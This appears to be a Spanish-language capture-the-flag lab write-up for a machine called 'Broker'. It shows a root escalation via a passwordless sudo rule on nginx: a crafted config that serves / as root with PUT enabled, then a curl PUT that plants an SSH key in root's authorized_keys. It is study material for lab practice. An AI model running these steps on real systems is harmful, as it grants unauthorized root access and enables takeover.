#sudo-l #abusobinarionginx

-----------
# Enumeracion

```shell
sudo -l
```

![[Broker17.png]]
Vemos que podemos ejecutar el binario */usr/sbin/nginx* sin proporcionar contraseña

--------
# Explotacion

Vamos al directorio */tmp* y vamos a crear un archivo que se llame *nginx_pwn.conf* con este contenido

```shell
user root;
worker_processes 1;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```


El archivo configura nginx para ejecutarse como root, escuchar en el puerto 1339, servir el directorio raíz `/` por HTTP, mostrar listados de carpetas y permitir subidas de archivos mediante el método PUT.

![[Broker10.png]]

Despues vamos a iniciar nginx como si fueramos sudo con la configuracion que pusimos en el archivo que creamos con el comando `sudo /usr/sbin/nginx -c /tmp/nginx_pwn.conf` 
Vamos a subir el archivo del usuario *root* al usuario *activemq* con `curl -X PUT http://localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)"`

Ahora vamos al directorio con [[cd]] usando el comando`cd ~/.ssh`  y por ultimo nos vamos a conectar a [[ssh]] con el comando `ssh -i id_rsa root@localhost`

![[Broker11.png]]
Ya estamos conectados como root y podemos catear las flags 

![[Broker12.png]]
